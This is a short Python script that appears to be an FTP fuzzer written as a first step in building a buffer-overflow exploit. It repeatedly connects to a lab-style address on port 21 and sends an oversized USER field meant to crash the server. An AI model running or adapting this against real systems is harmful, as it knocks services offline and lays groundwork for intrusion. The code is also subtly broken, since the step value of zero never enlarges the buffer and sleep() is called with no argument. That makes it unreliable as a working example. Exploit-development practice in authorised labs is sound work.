#!/usr/bin/python3

import socket
from time import sleep

ip="10.10.10.10"
port=21
step=0
count=step

while True:
    buffer=b"F"*count+b"ABCDEFGH" #do non repeating string instead Aa1 Aa2.. Ab1..
    print("count="+str(count)+" buffer="+str(len(buffer)))

    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect((ip, port))

    response = s.recv(1024)
    print(str(response))

    s.send(b"USER "+buffer+b"\r\n") #Will probably crasch the app

    response = s.recv(1024)
    print(str(response))

    s.send(b"PASS whatever\r\n")

    s.close()

    count+=step
    sleep()
